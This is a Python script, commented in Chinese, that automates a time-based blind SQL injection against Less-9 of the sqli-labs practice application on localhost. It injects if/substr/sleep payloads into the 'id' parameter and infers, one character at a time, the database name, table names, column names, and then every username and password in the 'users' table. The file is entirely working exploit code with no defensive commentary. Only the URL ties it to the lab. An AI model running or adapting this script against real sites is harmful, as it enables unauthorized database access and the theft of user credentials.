import requests


# 获取数据库名长度
def database_len():
    for i in range(1, 10):
        url = f"http://127.0.0.1:8080/sqli-labs-master/Less-9/?id=1' and if(length(database())>{i},1,sleep(2))"
        r = requests.get(url + '%23')
        if r.elapsed.total_seconds()>2:
            print('database_length:', i)
            return i


#获取数据库名
def database_name(databaselen):
     name = ''
     for j in range(1, databaselen+1):
        for i in "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz":
            url = "http://localhost:8080/sqli-labs-master/Less-9/?id=1' " \
                  "and if(substr(database(),%d,1)='%s',sleep(2),1)" % (j, i)
            #print(url+'%23')
            r = requests.get(url + '%23')
            if r.elapsed.total_seconds()>2:
                name = name + i
                break
     print('database_name:', name)


# 获取数据库表
def tables_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            url = "http://localhost:8080/sqli-labs-master/Less-9/?id=1' " \
                  "and if(substr((select group_concat(table_name) from information_schema.tables " \
                  "where table_schema=database()),%d,1)='%s',sleep(2),1)" % (j, i)
            r = requests.get(url + '%23')
            if r.elapsed.total_seconds()>2:
                name = name + i
                break
    print('table_name:', name)



# 获取表中字段
def columns_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            url = "http://localhost:8080/sqli-labs-master/Less-9/?id=1' " \
                  "and if(substr((select group_concat(column_name) from information_schema.columns where " \
                  "table_schema=database() and table_name='users'),%d,1)='%s',sleep(2),1)" % (j, i)
            r = requests.get(url + '%23')
            if r.elapsed.total_seconds()>2:
                name = name + i
                break
    print('column_name:', name)



# 获取username
def username_value():
    name = ''
    for j in range(1, 100):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':
            url = "http://localhost:8080/sqli-labs-master/Less-9/?id=1' " \
                  "and if(substr((select group_concat(username) from users),%d,1)='%s',sleep(2),1)" % (j, i)
            r = requests.get(url + '%23')
            if r.elapsed.total_seconds()>2:
                name = name + i
                break
    print('username_value:', name)



# 获取password
def password_value():
    name = ''
    for j in range(1, 100):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':
            url = "http://localhost:8080/sqli-labs-master/Less-9/?id=1' " \
                  "and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(2),1)" % (j, i)
            r = requests.get(url + '%23')
            if r.elapsed.total_seconds()>2:
                name = name + i
                break
    print('password_value:', name)


if __name__ == '__main__':
    dblen = database_len()
    database_name(dblen)
    tables_name()
    columns_name()
    username_value()
    password_value()


